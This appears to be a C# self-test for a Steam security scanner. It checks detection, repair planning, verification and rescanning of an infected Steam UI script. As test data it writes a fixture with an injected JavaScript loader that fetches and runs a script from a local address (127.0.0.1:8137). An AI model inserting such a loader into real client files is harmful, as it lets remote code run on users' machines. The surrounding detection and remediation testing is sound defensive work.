using System.IO;
using System.Text;
using System.Text.Json;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestSteamScriptRepairIntegrationAsync(string root)
    {
        string fixture = Path.Combine(root, "script-repair-integration-" + Guid.NewGuid().ToString("N"));
        string steam = Path.Combine(fixture, "Steam");
        string scripts = Path.Combine(steam, "steamui");
        string residentDirectory = Path.Combine(fixture, "SteamAlertDemo");
        Directory.CreateDirectory(scripts);
        Directory.CreateDirectory(residentDirectory);
        string path = Path.Combine(scripts, "chunk.js");
        const string loader = ";try{var s=document.createElement(\"script\");s.src=\"http://127.0.0.1:8137/x.js?\"+Date.now();document.head.append(s)}catch{}";
        byte[] original = Encoding.UTF8.GetBytes("(()=>{const synthetic='fixture';})();\n" + loader + "     ");
        await File.WriteAllBytesAsync(path, original);
        SteamLayout layout = new();
        layout.SteamRoots.Add(steam);
        string resident = Path.Combine(residentDirectory, "Application Frame Host.exe");
        await File.WriteAllTextAsync(resident, "Inert installed resident fixture. Never executed.");
        string residentHash = await Hashing.Sha256FileAsync(resident);
        RuleSet rules = new() { KnownHashes = [new() { Id = SteamAlertInstallation.ResidentRule, Sha256 = residentHash, Malware = true }] };
        Finding source = new()
        {
            RuleId = SteamAlertInstallation.ResidentRule, Category = FindingCategory.File, Target = resident,
            Sha256 = residentHash, TargetSha256 = residentHash, IsKnownMalware = true, CanRemediate = true,
            Severity = FindingSeverity.Critical, Score = 100, SuggestedActions = [SuggestedActionKind.QuarantineFile]
        };
        ScanReport report = new() { Findings = [source] };
        await new SteamSecurityScanner(rules).ScanAsync(layout, report);
        Finding finding = report.Findings.Single(f => f.RuleId == SteamScriptRepair.RuleId);
        Check("Steam script exact detection chooses repair without deleting the client chunk", finding.Target == path &&
            finding.CanRemediate && finding.IsKnownMalware && finding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamScript]) &&
            !report.Findings.Where(f => f.Target == path).Any(f => f.SuggestedActions.Contains(SuggestedActionKind.QuarantineFile)));
        SteamScriptRepairSnapshot snapshot = await SteamScriptRepairTarget.CaptureAsync(path, finding.Sha256, layout);
        byte[] preparedBytes = await File.ReadAllBytesAsync(path);
        Check("Steam script preparation leaves original bytes intact and binds two identities", original.SequenceEqual(preparedBytes) &&
            snapshot.OriginalSha256 == finding.Sha256 && snapshot.OriginalSha256 != snapshot.RepairedSha256 &&
            FileScopeSafety.IsValidIdentity(snapshot.FileIdentity) && FileScopeSafety.IsValidIdentity(snapshot.ParentIdentity));

        // Use the normal batch preparation implementation with a fixture installation layout.
        RemediationBatchSession batch = await new RemediationBatchPlanner(rules, layout, residentDirectory)
            .PrepareAsync([source], report, false);
        RemediationPlan plan = batch.Plans.Single();
        RemediationAction repair = plan.Actions.Single(a => a.Type == RemediationActionType.RepairSteamScript);
        RemediationAction quarantine = plan.Actions.Single(a => a.Type == RemediationActionType.QuarantineFile && a.Target == resident);
        Check("Selecting only an installed source automatically includes script repair in its same batch", repair.Target == path &&
            repair.RepairedSha256 == snapshot.RepairedSha256 && batch.Targets.Any(t => t.Target == path && t.AddedByAssociation &&
                t.ActionIds.Contains(repair.ActionId) && t.State == RemediationTargetState.Ready));
        Check("Script repair runs after verified source cleanup", plan.Actions.IndexOf(quarantine) < plan.Actions.IndexOf(repair) &&
            RemediationDependencies.Build(plan.Actions)[repair.ActionId].Contains(quarantine.ActionId));
        RemediationBatchSession selectedRepair = await new RemediationBatchPlanner(rules, layout, residentDirectory)
            .PrepareAsync([finding], report, false);
        Check("Selecting a script automatically includes its known installed source", selectedRepair.Plans.Count == 1 &&
            selectedRepair.Plans[0].Actions.Any(a => a.Target == resident && a.Type == RemediationActionType.QuarantineFile) &&
            selectedRepair.Targets.Any(t => t.Target == resident && t.AddedByAssociation));

        string serialized = JsonSerializer.Serialize(plan, JsonFile.Options);
        RemediationPlan loaded = JsonSerializer.Deserialize<RemediationPlan>(serialized, JsonFile.Options)!;
        Check("Saved repair plans retain hashes, file identities and dependency order", RemediationPlanIdentity.Fingerprint(loaded) ==
            RemediationPlanIdentity.Fingerprint(plan) && loaded.Actions.Single(a => a.Type == RemediationActionType.RepairSteamScript)
                .RepairedSha256 == snapshot.RepairedSha256);
        string changed = serialized.Replace(snapshot.RepairedSha256, new string('A', 64), StringComparison.Ordinal);
        Check("The repaired digest is part of the confirmed plan identity", RemediationPlanIdentity.Fingerprint(
            JsonSerializer.Deserialize<RemediationPlan>(changed, JsonFile.Options)!) != RemediationPlanIdentity.Fingerprint(plan));

        WindowsRemediationStateProbe probe = new((_, _) => Task.FromResult<string?>(null));
        Check("Unmodified infected script remains a verified residual", (await probe.ObserveAsync(repair, default)).Status == RemediationVerificationStatus.ResidualDetected);
        _ = SteamScriptRepair.TryRepair(original, out byte[] restored);
        await File.WriteAllBytesAsync(path, restored);
        Check("Post-repair verification checks the complete file digest", (await probe.ObserveAsync(repair, default)).Status == RemediationVerificationStatus.Verified);
        ScanReport rescanned = new();
        await new SteamSecurityScanner(rules).ScanAsync(layout, rescanned);
        Check("The repaired script has no family injection or loopback finding on rescan", !rescanned.Findings.Any(f =>
            f.Target == path && f.RuleId is SteamScriptRepair.RuleId or "STEAM-UI-LOOPBACK-SCRIPT"));
        RemediationBatchSession stale = await new RemediationBatchPlanner(rules, layout, residentDirectory).PrepareAsync([finding], report, false);
        Check("A stale infected snapshot cannot schedule repair against new bytes", stale.Plans.Count == 0 &&
            stale.Targets.Single(t => t.Target == path).State == RemediationTargetState.NotIncluded);
        await File.WriteAllTextAsync(path, "/* Independent Steam update. */");
        Check("Steam updates remain an unverified changed result", (await probe.ObserveAsync(repair, default)).Status == RemediationVerificationStatus.Unknown);
        await File.WriteAllBytesAsync(path, original);
        File.Delete(resident);
        RemediationBatchSession residual = await new RemediationBatchPlanner(rules, layout, residentDirectory)
            .PrepareAsync([finding], new ScanReport { Findings = [finding] }, false);
        Check("Known injection left after earlier cleanup can be repaired independently", residual.Plans.Count == 1 &&
            residual.Plans[0].Actions.Any(a => a.Type == RemediationActionType.RepairSteamScript));

        string outside = Path.Combine(fixture, "outside.js");
        await File.WriteAllBytesAsync(outside, original);
        bool rejected = false;
        try { await SteamScriptRepairTarget.CaptureAsync(outside, snapshot.OriginalSha256, layout); }
        catch (InvalidDataException) { rejected = true; }
        Check("Repair preparation rejects scripts outside installed Steam roots", rejected);

        RemediationAction old = new() { Type = RemediationActionType.QuarantineFile, Target = "legacy-fixture" };
        Check("Legacy plan serialization remains unchanged by absent repair fields", !JsonSerializer.Serialize(old, JsonFile.Options)
            .Contains("RepairedSha256", StringComparison.OrdinalIgnoreCase));
    }
}
